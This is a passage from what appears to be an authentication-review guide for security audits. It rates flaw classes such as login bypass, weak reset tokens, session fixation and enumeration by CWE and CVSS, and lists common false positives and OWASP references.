| Auth bypass at login (alg:none, missing signature validation, logic bypass) | CWE-287 | Critical | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8) |
| Predictable / non-expiring / replayable reset token -> account takeover | CWE-640 | High-Critical | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Session fixation | CWE-384 | High | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L` |
| Missing rate limiting / lockout enabling stuffing | CWE-307 | Medium-High | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5) |
| Username/email enumeration | CWE-204 | Low-Medium | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (5.3) |
| Sessions never expiring / logout not invalidating | CWE-613 | Medium-High | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |
| Unverified password change (no current-password/MFA check) | CWE-620 | High | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| Weak password policy / weak storage | CWE-521 | Medium-High | context-dependent; offline-crack exposure raises it |
| Hard-coded credentials reachable in prod | CWE-798 | Critical if privileged | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Missing MFA on sensitive operations | CWE-287 | Medium | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |

Rubric anchors:
- Auth-bypass-on-login of any kind = always Critical; do not discount for exploit complexity unless a second secret is genuinely required.
- Account takeover via recovery flaws = High minimum; Critical when unauthenticated, scalable, and silent (no victim notification).
- Enumeration alone = Low on small/internal user bases, Medium when combined with stuffing or on large public bases.
- Fixation = High when an attacker can realistically plant the identifier (subdomain injection, shared kiosk); otherwise Medium.
- Cookie attribute gaps alone = Low/Informational; escalate when combined with non-HTTPS or XSS presence (cross-ref config/xss modules).

## Common False Positives

- md5/sha1 hits used for cache keys, ETags, checksums, or non-secret identifiers — verify the input is actually a password/token.
- bcrypt cost 10 flagged where the org's documented standard is 10+; confirm policy docs before rating.
- `jwt.decode` present but only for logging claims, with a real `verify` upstream in middleware — trace call order before flagging.
- Seed accounts confined to dev-only seeders guarded by environment checks (`RAILS_ENV=test`, `if env.DEBUG`) and excluded from release builds.
- Identical-looking responses differing only by compression artifacts; timing deltas within network jitter (< ~50 ms inconsistent).
- Long-lived refresh tokens WITH rotation and reuse-detection implemented — long life alone is not the flaw.
- Test backdoors gated behind explicit test-only build flags verified absent in shipped bundles.
- Lockout "missing" because protection lives at WAF/gateway layer outside the repo — note as external control, not absent.

## References

CWE entries:
- CWE-287 Improper Authentication
- CWE-204 Observable Response Discrepancy
- CWE-307 Improper Restriction of Excessive Authentication Attempts
- CWE-330 Use of Insufficiently Random Values
- CWE-384 Session Fixation
- CWE-521 Weak Password Requirements
- CWE-613 Insufficient Session Expiration
- CWE-620 Unverified Password Change
- CWE-640 Weak Password Recovery Mechanism for Forgotten Password
- CWE-798 Use of Hard-coded Credentials

OWASP (stable URLs):
- OWASP Top 10 2021 A07 Identification and Authentication Failures: https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
- Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- Session Management Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- Password Storage Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
- Multifactor Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html
- Forgot Password Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html
- JSON Web Token for Java Cheat Sheet (framework-agnostic JWT guidance): https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
- ASVS 4.0.3 V2 Authentication (2.1 password security, 2.5 credential recovery, 2.6 look-up secrets, 2.8 one-time verifiers) and V3 Session Management (3.1 fundamentals through 3.7): https://owasp.org/www-project-application-security-verification-standard/
- Web Security Testing Guide, Authentication Testing: https://owasp.org/www-project-web-security-testing-guide/
